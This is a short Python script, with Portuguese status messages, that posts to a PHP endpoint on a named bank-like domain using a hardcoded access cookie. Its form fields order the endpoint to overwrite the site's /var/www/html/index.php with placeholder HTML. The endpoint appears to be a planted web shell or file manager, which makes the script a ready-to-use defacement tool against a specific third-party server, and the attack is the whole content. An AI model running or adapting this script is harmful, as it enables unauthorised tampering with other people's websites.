import requests

URL_POST = "http://www.bancocn.com/testemano/NIENIEN.php"

COOKIES = {"acesso_picudo": "cookiepicudo"}

HTML_CONTENT = """
Your HTML5
"""

data = {
    "content": HTML_CONTENT,
    "action": "edit",
    "file": "/var/www/html/index.php",
    "dir": "/var/www/html/",
    "save": "save"
}

try:
    response = requests.post(URL_POST, cookies=COOKIES, data=data)
    if response.status_code == 200:
        print("POST enviado com sucesso!")
    else:
        print(f"POST retornou código {response.status_code}")
except Exception as e:
    print(f"Erro ao enviar POST: {e}")
